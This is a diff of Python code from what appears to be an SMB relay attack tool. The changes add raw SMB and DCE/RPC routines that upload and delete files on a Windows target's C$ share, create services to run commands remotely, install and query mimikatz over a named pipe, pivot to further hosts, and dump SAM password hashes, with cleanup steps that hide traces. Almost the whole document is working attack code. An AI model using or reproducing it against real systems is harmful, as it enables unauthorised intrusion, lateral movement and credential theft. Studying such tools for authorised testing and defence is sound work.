+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to open the service.\n"
+            return ModifySMBRetCode(data)
+        ContextHandler = data[84:104]
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
+        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLQueryService.
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to start the service.\n"
+            return ModifySMBRetCode(data)
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLQueryService(ContextHandle=ContextHandlerService)
+        x = SMBDCEPacketData(Opnum="\x06\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
+        s.send(buffer1)
+        data = s.recv(2048)
+        s.send(buffer1)
+        data = s.recv(2048)
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    ## DCE/RPC SVCCTLControlService, stop operation.
+    if data[8:10] == "\x25\x00":
+        if data[len(data)-4:] == "\x05\x00\x00\x00":
+            print "[+] Failed to query the service.\n"
+            return ModifySMBRetCode(data)
+        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        w = SMBDCESVCCTLControlService(ContextHandle=ContextHandlerService,ControlOperation = "\x01\x00\x00\x00")
+        x = SMBDCEPacketData(Opnum="\x01\x00",Data=w)
+        x.calculate()
+        t = SMBTransDCERPC(FID=f,Data=x)
+        t.calculate()
+        packet0 = str(head)+str(t)
+        buffer1 = longueur(packet0)+packet0
         s.send(buffer1)
         data = s.recv(2048)
 
@@ -735,6 +1157,17 @@ def CloseFID(f, data, s):
         data = s.recv(2048)
         return data, s
 
+def SMBDCERPCCloseFID(f, data, s):
+    ##Close FID Request
+    if data[8:10] == "\x2e\x00":
+        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
+        t = CloseRequest(FID = f)
+        packet1 = str(head)+str(t)
+        buffer1 = longueur(packet1)+packet1  
+        s.send(buffer1)
+        data = s.recv(2048)
+        return data, s
+
 ###########################
 #Open a file for reading
 ###########################
@@ -752,7 +1185,7 @@ def SMBOpenFile(Filename, Share, Host, Access, data, s):
     ##OpenAndX.
     if data[8:10] == "\x75\x00":
         head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
-        t = OpenAndX(File=Filename, OpenFunc="\x01\x00",DesiredAccess=Access)
+        t = OpenAndX(File=Filename, OpenFunc="\x01\x00", Flags="\x07\x00", DesiredAccess=Access)
         t.calculate()
         packet1 = str(head)+str(t)
         buffer1 = longueur(packet1)+packet1  
@@ -765,12 +1198,22 @@ def SMBOpenFile(Filename, Share, Host, Access, data, s):
         #We'll recover that connection..
         return data, s, f
 
+    if data[8:10] == "\x2d\x43":
+        time.sleep(1)
+        head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
+        t = OpenAndX(File=Filename, OpenFunc="\x01\x00",DesiredAccess=Access)
+        t.calculate()
+        packet1 = str(head)+str(t)
+        buffer1 = longueur(packet1)+packet1
+        s.send(buffer1)
+        data = s.recv(2048)
+
     if data[8:10] == "\x2d\x00":##Found all good.
         f = data[41:43]
         return data, s, f
 
     if data[8:10] == "\x2d\x34":#not found
-        time.sleep(5)#maybe still processing the cmd. Be patient, then grab it again.
+        time.sleep(2)#maybe still processing the cmd. Be patient, then grab it again.
         head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
         t = OpenAndX(File=Filename, OpenFunc="\x01\x00")
         t.calculate()
@@ -790,14 +1233,77 @@ def SMBOpenFile(Filename, Share, Host, Access, data, s):
              return data, s, f
 
 ###########################
-#Read then delete it.
+#Open a file for writing
+###########################
+
+def SMBOpenFileForWriting(Filename, FileSize, FileContent, Share, Host, Access, data, s):
+    ##Start with a Tree connect on C$
+    head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+    t = SMBTreeConnectData(Path="\\\\"+Host+"\\"+Share+"$")
+    t.calculate()
+    packet1 = str(head)+str(t)
+    buffer1 = longueur(packet1)+packet1
+    s.send(buffer1)
+    data = s.recv(2048)
+
+    ##NtCreate.
+    if data[8:10] == "\x75\x00":
+        head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
+        t = SMBNTCreateData(FileName="Windows\\Temp\\"+Filename, CreateFlags="\x00\x00\x00\x00", AccessMask="\x96\x01\x03\x00",FileAttrib="\x20\x00\x00\x00", ShareAccess="\x00\x00\x00\x00", Disposition = "\x02\x00\x00\x00", CreateOptions="\x44\x00\x00\x00")
+        t.calculate()
+        packet1 = str(head)+str(t)
+        buffer1 = longueur(packet1)+packet1  
+        s.send(buffer1)
+        data = s.recv(2048)
+
+    if data[8:10] == "\xa2\x22":
+        print "[+] Can't open the file, access is denied (write protected file?)."
+        f = "A" #Don't throw an exception at the calling function because there's not enough value to unpack.
+        #We'll recover that connection..
+        return data, s, f
+
+    if data[8:10] == "\xa2\x35":
+        print "[+] Name collision, this file already exist in windows/temp/. Try: delete /windows/Temp/"+Filename
+        f = "A" #Don't throw an exception at the calling function because there's not enough value to unpack.
+        #We'll recover that connection..
+        return data, s, f
+
+    if data[8:10] == "\xa2\x00":##Found, all good.
+        f = data[42:44]
+        return data, s, f
+
+        ##OpenAndX.
+        if data[8:10] == "\xa2\x34":
+            print "[+] The command failed or took to long to complete."
+            return data, s
+
+        ##all good.
+        if data[8:10] == "\xa2\x00":
+             f = data[41:43]
+             return data, s, f
+###########################
+#Open an IPC$ channel.
 ###########################
 
 def SMBOpenPipe(Host, data, s):
-    ##Start with a Tree connect on C$
+    ##Start with a Tree connect on IPC$
     head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
     t = SMBTreeConnectData(Path="\\\\"+Host+"\\IPC$")
     t.calculate()
+    packet1 = str(head)+str(t)
+    buffer1 = longueur(packet1)+packet1
+    s.send(buffer1)
+    data = s.recv(2048)
+    return data, s
+
+###########################
+#Close a TID
+###########################
+
+def CloseTID(data, s):
+    ##Start with a Tree connect on IPC$
+    head = SMBHeader(cmd="\x71",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+    t = SMBTreeDisconnect()
     packet1 = str(head)+str(t)
     buffer1 = longueur(packet1)+packet1
     s.send(buffer1)
@@ -865,6 +1371,62 @@ def GrabAndRead(f, Filename, data, s):
         return data, s, Output
 
 ###########################
+#Write it.
+###########################
+def UploadAndWrite(f, FileSize, FileContent, data, s):
+    ##WriteRequest for a small file.
+    if data[8:10] == "\xa2\x00" and FileSize <= 29999:
+       head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
+       t = SMBWriteData(FID=f, Data=FileContent)
+       t.calculate()
+       packet1 = str(head)+str(t)
+       buffer1 = longueur(packet1)+packet1  
+       s.send(buffer1)
+       data = s.recv(2048)
+    ##WriteRequest for a big file.
+    if data[8:10] == "\xa2\x00" and FileSize >= 30000: 
+       ##How many requests?
+       count_number = int(FileSize/30000)+1
+       #Do progress bar for large uploads, so the pentester doesn't fall asleep while doing a large SMB write operations..
+       dataoffset = 0
+       count = 0
+       bar = 80
+       start_time = time.time()
+       print 'File size: %s'%(GetReadableSize(FileSize))
+       for i in xrange(count_number):
+              count = count+1
+              Chunk = FileContent[dataoffset:dataoffset+30000]
+              alreadydone = int(round(80 * count / float(count_number)))
+              pourcent = round(100.0 * count / float(count_number), 1)
+              progress = '=' * alreadydone + '-' * (80 - alreadydone)
+              sys.stdout.write('[%s] %s%s\r' % (progress, pourcent, '%'))
+              sys.stdout.flush() 
+
+              if len(Chunk) == 0:
+                 pass
+              else:
+                 data, s = WriteOutput(struct.pack("<I",dataoffset), Chunk, data, f, s)
+                 dataoffset = dataoffset + 30000
+       sys.stdout.write('\n')
+       sys.stdout.flush()
+       Seconds = (time.time() - start_time) - READTIMEOUT
+       if Seconds>60:
+              minutes = Seconds/60
+              print 'Uploaded in: %.3g minutes.'%(minutes)
+       if Seconds<60:
+              print 'Uploaded in: %.3g seconds'%(Seconds)
+
+    ##Close Request
+    if data[8:10] == "\x2f\x00":
+        head = SMBHeader(cmd="\x04",flag1="\x18", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
+        t = CloseRequest(FID = f)
+        packet1 = str(head)+str(t)
+        buffer1 = longueur(packet1)+packet1  
+        s.send(buffer1)
+        data = s.recv(2048)
+        return data, s
+
+###########################
 #Read then delete it.
 ###########################
 def ReadAndDelete(f, Filename, data, s):
@@ -929,12 +1491,10 @@ def ReadAndDelete(f, Filename, data, s):
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
-       #print "[+] Deleting file now."
        s.send(buffer1)
        data = s.recv(2048)
 
     if data[8:10] == "\x06\x00":
-       #print "[+] File deleted, making sure it's not there anymore.." 
        head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
        t = OpenAndX(File=Filename, OpenFunc="\x01\x00")
        t.calculate()
@@ -943,6 +1503,55 @@ def ReadAndDelete(f, Filename, data, s):
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, Output
+
+def DeleteAFile(Filename, data, s, Host):
+    ##Start with a Tree connect on C$
+    head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+    t = SMBTreeConnectData(Path="\\\\"+Host+"\\C$")
+    t.calculate()
+    packet1 = str(head)+str(t)
+    buffer1 = longueur(packet1)+packet1
+    s.send(buffer1)
+    data = s.recv(2048)
+
+    ##DeleteFileRequest.
+    if data[8:10] == "\x75\x00":
+       head = SMBHeader(cmd="\x06",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x13\x00")
+       t = DeleteFileRequest(File=Filename)
+       t.calculate()
+       packet1 = str(head)+str(t)
+       buffer1 = longueur(packet1)+packet1  
+       s.send(buffer1)
+       data = s.recv(2048)
+
+    if data[8:10] == "\x06\x21":
+       time.sleep(1)
+       head = SMBHeader(cmd="\x06",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x13\x00")
+       t = DeleteFileRequest(File=Filename)
+       t.calculate()
+       packet1 = str(head)+str(t)
+       buffer1 = longueur(packet1)+packet1  
+       s.send(buffer1)
+       data = s.recv(2048)
+
+    if data[8:10] == "\x06\x21":
+       print "[+] Delete Failed. Server ("+Host+") returned STATUS_CANNOT_DELETE, "+Filename+" is currently in use by another process."
+       print "[+] Try taskkill /F /IM process_name, then delete the file."
+       return data, s
+
+    if data[8:10] == "\x06\x34":
+       print "[+] Delete Failed. File not found."
+       return data, s
+
+    if data[8:10] == "\x06\x00":
+       head = SMBHeader(cmd="\x2d",flag1="\x10", flag2="\x00\x10",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x11\x00")
+       t = OpenAndX(File=Filename, OpenFunc="\x01\x00")
+       t.calculate()
+       packet1 = str(head)+str(t)
+       buffer1 = longueur(packet1)+packet1  
+       s.send(buffer1)
+       data = s.recv(2048)
+       return data, s
 
 def GrabKeyValue(s, f, handler, data, keypath):
     ## DCE/RPC OpenKey.
@@ -1088,7 +1697,7 @@ def DumpHashes(data, s, Host):
        if f == "ServiceNotFound":
            stopped = True 
            data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
-           data,s,f     = StartWinregService(f, Host[0], data, s)
+           data,s,f     = StartWinregService(f, Host, data, s)
            data,s       = CloseFID(f, data,s)
            #We should be all good here.
            data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)
@@ -1112,26 +1721,26 @@ def DumpHashes(data, s, Host):
        RandomFile    = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.tmp'
        data,s,f      = SaveKeyToFile("C:\\Windows\\Temp\\"+RandomFile, "SAM", handler, f, data, s)
        data,s        = CloseFID(f, data, s)
-       data,s,f      = SMBOpenFile("\\Windows\\Temp\\"+RandomFile, "C", Host[0], RW, data, s)
+       data,s,f      = SMBOpenFile("\\Windows\\Temp\\"+RandomFile, "C", Host, RW, data, s)
        data,s,Output = ReadAndDelete(f, "\\Windows\\Temp\\"+RandomFile, data, s)
 
        #If the service was stopped before we came...
        if stopped:
-           data,s       = SMBOpenPipe(Host[0], data, s)#Get a new IPC$ TID.
+           data,s       = SMBOpenPipe(Host, data, s)#Get a new IPC$ TID.
            data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
-           data,s,f     = StopWinregService(f, Host[0], data, s)
+           data,s,f     = StopWinregService(f, Host, data, s)
            data,s       = CloseFID(f, data,s)
            data         = ModifySMBRetCode(data)
 
        #After everything has been cleaned up, we write to file and call creddump
-       WriteOutputToFile(Output, "./Sam-"+Host[0]+".tmp")
+       WriteOutputToFile(Output, "./Sam-"+Host+".tmp")
        try:
-           Hashes = dump_file_hashes(BootKey, SaveSam_Path+"./Sam-"+Host[0]+".tmp")
-           WriteOutputToFile(Hashes, "./Hash-Dump-"+Host[0]+".txt")
+           Hashes = dump_file_hashes(BootKey, SaveSam_Path+"./Sam-"+Host+".tmp")
+           WriteOutputToFile(Hashes, "./Hash-Dump-"+Host+".txt")
        except:
            print "[+] Live dump failed, is python-crypto installed? "
            pass
-       print "[+] The SAM file was saved in: ./relay-dumps/Sam-"+Host[0]+".tmp and the hashes in ./relay-dumps/Hash-Dumped-"+Host[0]+".txt"
+       print "[+] The SAM file was saved in: ./relay-dumps/Sam-"+Host+".tmp and the hashes in ./relay-dumps/Hash-Dumped-"+Host+".txt"
        return data
 
     except:
@@ -1159,7 +1768,7 @@ def SaveAKey(data, s, Host, Key):
        if f == "ServiceNotFound":
            stopped = True 
            data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
-           data,s,f     = StartWinregService(f, Host[0], data, s)
+           data,s,f     = StartWinregService(f, Host, data, s)
            data,s       = CloseFID(f, data,s)
            #We should be all good here.
            data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)
@@ -1177,20 +1786,20 @@ def SaveAKey(data, s, Host, Key):
           print "[+] Something went wrong, try something else."
           return ModifySMBRetCode(data)
        data,s        = CloseFID(f, data, s)
-       data,s,f      = SMBOpenFile("\\Windows\\Temp\\"+Key+".tmp", "C", Host[0], RW, data, s)
+       data,s,f      = SMBOpenFile("\\Windows\\Temp\\"+Key+".tmp", "C", Host, RW, data, s)
        data,s,Output = ReadAndDelete(f, "\\Windows\\Temp\\"+Key+".tmp", data, s)
 
        #If the service was stopped before we came...
        if stopped:
-           data,s       = SMBOpenPipe(Host[0], data, s)#Get a new IPC$ TID.
+           data,s       = SMBOpenPipe(Host, data, s)#Get a new IPC$ TID.
            data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
-           data,s,f     = StopWinregService(f, Host[0], data, s)
+           data,s,f     = StopWinregService(f, Host, data, s)
            data,s       = CloseFID(f, data,s)
            data         = ModifySMBRetCode(data)
 
        #After everything has been cleaned up, we write the output to a file.
-       WriteOutputToFile(Output, Host[0]+"-"+Key+".tmp")
-       print "[+] The "+Key+" key and its subkeys were saved in: ./relay-dumps/"+Host[0]+"-"+Key+".tmp"
+       WriteOutputToFile(Output, Host+"-"+Key+".tmp")
+       print "[+] The "+Key+" key and its subkeys were saved in: ./relay-dumps/"+Host+"-"+Key+".tmp"
        return data
 
     except:
@@ -1202,7 +1811,7 @@ def SaveAKey(data, s, Host, Key):
 def ReadFile(data, s, File, Host):
     try:
        File = File.replace("/","\\")
-       data,s,f      = SMBOpenFile(File, "C", Host[0], READ, data, s)
+       data,s,f      = SMBOpenFile(File, "C", Host, READ, data, s)
        data,s,Output = GrabAndRead(f, File, data, s)
        print Output
        return ModifySMBRetCode(data) ##Command was successful, ret true.
@@ -1214,9 +1823,9 @@ def ReadFile(data, s, File, Host):
 def GetAfFile(data, s, File, Host):
     try:
        File = File.replace("/","\\")
-       data,s,f      = SMBOpenFile(File, "C", Host[0], READ, data, s)
+       data,s,f      = SMBOpenFile(File, "C", Host, READ, data, s)
        data,s,Output = GrabAndRead(f, File, data, s)
-       WriteOutputToFile(Output, Host[0]+"-"+File)
+       WriteOutputToFile(Output, Host+"-"+File)
        print "[+] Done."
        return ModifySMBRetCode(data) ##Command was successful, ret true.
 
@@ -1224,16 +1833,166 @@ def GetAfFile(data, s, File, Host):
        print "[+] Get file failed. Remote filename was typed correctly?"
        return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.
 
+##########UploadAFile#############
+def WriteFile(data, s, File,  FileSize, FileContent, Host):
+    try:
+       File          = File.replace("/","\\")
+       data,s,f      = SMBOpenFileForWriting(File, FileSize, FileContent, "C", Host, RW, data, s)
+       data,s        = UploadAndWrite(f, FileSize, FileContent, data, s)
+       return ModifySMBRetCode(data) ##Command was successful, ret true.
+
+    except:
+       print "[+] Write failed."
+       return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.
+
+##########DeleteAFile############
+def DeleteFile(data, s, File, Host):
+    try:
+       File          = File.replace("/","\\")
+       data,s        = DeleteAFile(File, data, s, Host)
+       data,s        = CloseTID(data, s)
+       return        ModifySMBRetCode(data) ##Command was successful, ret true.
+    except:
+       print "[+] Delete operation failed.\n[+] Something went wrong."
+       data,s        = CloseTID(data, s)
+       return        ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.
+
 ##########Psexec#############
-def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
+def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, RunPath, FileName):
 
     try:
-       data,s,f      = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
-       data,s,f      = CreateService(Command, f, Host[0], data, s)
-       data,s        = CloseFID(f, data,s)
-       data,s,f      = SMBOpenFile("\\Windows\\Temp\\Results.txt", "C", Host[0], RW, data, s)
-       data,s,Output = ReadAndDelete(f, "\\Windows\\Temp\\Results.txt", data, s)
+       RandomFName      = GenerateRandomFileName()
+       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
+       LogFile          = "\\Windows\\Temp\\"+RandomFName+".txt"
+       Command          = RunPath+" \""+Command+"\" \""+WinTmpPath+"\""
+       ServiceNameChars = GenerateServiceName()
+       ServiceIDChars   = GenerateServiceID()
+
+       data,s           = SMBOpenPipe(Host, data, s)
+       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
+       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
+       data,s           = CloseFID(f, data,s)
+       time.sleep(1)
+       data,s,f         = SMBOpenFile(LogFile, "C", Host, RW, data, s)
+       data,s,Output    = ReadAndDelete(f, LogFile, data, s)
        print Output
+       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)
+
+       Logs.info('Command executed:')
+       Logs.info(clientIP+","+Username+','+Command)      
+
+       return data
+
+    except:
+       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
+       print "[+] Something went wrong, try something else."
+       return ModifySMBRetCode(data)
+
+##########Runas#############
+def RunAsCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
+
+    try:
+       Command          = Command.replace('"', '\'')
+       RandomFName      = GenerateRandomFileName()
+       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
+       LogFile          = "\\Windows\\Temp\\"+RandomFName+".txt"
+       Command          = "%windir%\\Temp\\"+FileName+" \""+Command+"\" \""+WinTmpPath+"\""
+       ServiceNameChars = GenerateServiceName()
+       ServiceIDChars   = GenerateServiceID()
+
+       data,s           = SMBOpenPipe(Host, data, s)
+       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
+       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
+       data,s           = CloseFID(f, data,s)
+       time.sleep(1)
+       data,s,f         = SMBOpenFile( LogFile, "C", Host, RW, data, s)
+       data,s,Output    = ReadAndDelete(f, LogFile, data, s)
+       print Output
+       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)
+
+       Logs.info('Command executed:')
+       Logs.info(clientIP+","+Username+','+Command)      
+       return data
+
+    except:
+       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)
+       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
+       print "[+] Something went wrong, try something else."
+       return ModifySMBRetCode(data)
+
+##########MimiKatz RPC#############
+def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
+    global MimiKatzSVCID
+    global MimiKatzSVCName
+    try:
+       RandomFName      = GenerateRandomFileName()
+       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
+       #Install mimikatz as a service.
+       Command          = "c:\\Windows\\Temp\\"+FileName+" \"rpc::server /protseq:ncacn_np /endpoint:\pipe\wtf /noreg\" service::me exit"
+       MimiKatzSVCName  = GenerateServiceName()
+       MimiKatzSVCID    = GenerateServiceID()
+
+       data,s           = SMBOpenPipe(Host, data, s)
+       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
+       data,s,f         = CreateMimikatzService(Command,  MimiKatzSVCName, MimiKatzSVCID, f, Host, data, s)
+       data,s           = CloseFID(f, data,s)
+
+       Logs.info('Command executed:')
+       Logs.info(clientIP+","+Username+','+Command)      
+
+       return data
+
+    except:
+       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
+       print "[+] Something went wrong, try something else."
+       return ModifySMBRetCode(data)
+
+def RunMimiCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
+    try:
+       InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName)
+       data,s        = SMBOpenPipe(Host, data, s)
+       ##Wait for the pipe to come up..
+       time.sleep(1)
+       data,s,f      = BindCall("\xe9\x11\xfc\x17\x58\xc2\x8d\x4b\x8d\x07\x2f\x41\x25\x15\x62\x44", "\x01\x00", "\\wtf", data, s)
+       data,s,f      = MimiKatzRPC(Command, f, Host, data, s)
+       data,s        = SMBDCERPCCloseFID(f, data,s)
+       #####
+       #Kill the SVC now... Never know when the user will leave, so lets not leave anything on the target.
+       data,s           = SMBOpenPipe(Host, data, s)
+       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
+       data,s,f         = StopAndDeleteService(Command,  MimiKatzSVCName, MimiKatzSVCID, f, Host, data, s)
+       data,s           = CloseFID(f, data,s)
+       #Short sleep, to make sure the service had the time needed to stop before deleting mimikatz
+       time.sleep(0.5)
+       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)
+
+       Logs.info('Command executed:')
+       Logs.info(clientIP+","+Username+','+Command)      
+
+       return ModifySMBRetCode(data)
+    except:
+       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
+       print "[+] Something went wrong while calling mimikatz. Did you run install mimi before launching this command?"
+       return ModifySMBRetCode(data)
+
+##########Pivot#############
+def PivotToOtherHost(data, s, clientIP, Username, Domain, Logs, Host, RunAsPath, RunAsFileName):
+
+    try:
+       LocalIp          = FindLocalIp()
+       WinTmpPath       = "%windir%\\Temp\\log.txt"
+       Command          = RunAsPath+" \"net view \\\\"+LocalIp+"\" \""+WinTmpPath+"\""
+       ServiceNameChars = GenerateServiceName()
+       ServiceIDChars   = GenerateServiceID()
+
+       data,s           = SMBOpenPipe(Host, data, s)
+       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
+       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
+       data,s           = CloseFID(f, data,s)
+
+       ## We're leaving this host, clean it up..
+       time.sleep(1.5)
+       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+RunAsFileName, Host)
        Logs.info('Command executed:')
        Logs.info(clientIP+","+Username+','+Command)      
        return data
@@ -1243,4 +2002,48 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
        print "[+] Something went wrong, try something else."
        return ModifySMBRetCode(data)
 
+##########VerifyPivot#############
+def VerifyPivot(data, s, clientIP, Username, Domain, Pivot, Logs, Host, RunAsPath, RunAsFileName):
+
+    try:
+       RandomFName      = GenerateRandomFileName()
+       ServiceNameChars = GenerateServiceName()
+       ServiceIDChars   = GenerateServiceID()
+       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
+       LogFile          = "\\Windows\\Temp\\"+RandomFName+".txt"
+       Command          = RunAsPath+" \"dir \\\\"+Pivot+"\\C$\" \""+WinTmpPath+"\""
+
+       data,s           = SMBOpenPipe(Host, data, s)
+       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
+       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
+       data,s           = CloseFID(f, data,s)
+       data,s,f         = SMBOpenFile(LogFile, "C", Host, RW, data, s)
+       data,s,Output    = ReadAndDelete(f, LogFile, data, s)
+       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+RunAsFileName, Host)
+
+       Logs.info('Command executed:')
+       Logs.info(clientIP+","+Username+','+Command)
+
+       if re.findall('Volume in drive', Output):
+          return True, data
+       else:
+          return False, data     
+
+    except:
+       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
+       print "[+] Something went wrong, try something else."
+       return ModifySMBRetCode(data)
+
+##########DoSomethingDumb#############
+def DumbSMBChain(data, s, Host):
+    try:
+       File          = "/Windows/win.ini"
+       File          = File.replace("/","\\")
+       data,s,f      = SMBOpenFile(File, "C", Host, READ, data, s)
+       data,s,Output = GrabAndRead(f, File, data, s)
+       data, s       = CloseTID(data, s)
+       return ModifySMBRetCode(data) ##Command was successful, ret true.
+
+    except:
+       return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.
 
